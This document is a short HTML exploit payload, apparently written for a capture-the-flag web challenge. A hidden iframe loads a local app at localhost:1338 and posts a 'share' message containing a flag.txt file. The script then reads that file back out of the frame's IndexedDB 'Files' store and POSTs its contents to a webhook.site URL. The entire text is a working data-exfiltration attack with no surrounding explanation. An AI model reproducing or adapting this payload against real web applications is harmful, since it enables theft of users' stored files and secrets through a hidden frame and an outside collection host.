<iframe src="http://localhost:1338" style="display:none" onload="this.contentWindow.postMessage({
  type: 'share',
  files: [{
    blob: new Blob(['<FLAG LEAKED>'], { type: 'text/plain' }),
    name: 'flag.txt',
    cached: false
  }]
}, '*');

setTimeout(() => {
  this.contentWindow.indexedDB.open('Files', 1).onsuccess = e => {
    const db = e.target.result;
    const tx = db.transaction('files');
    const store = tx.objectStore('files');
    const get = store.getAll();
    get.onsuccess = () => {
      const file = get.result.find(x => x.file && x.file.name === 'flag.txt');
      if (!file) return;
      const r = new FileReader();
      r.onload = () => fetch('https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df', { method: 'POST', body: r.result });
      r.readAsText(file.file);
    };
  };
}, 1000);">
</iframe>
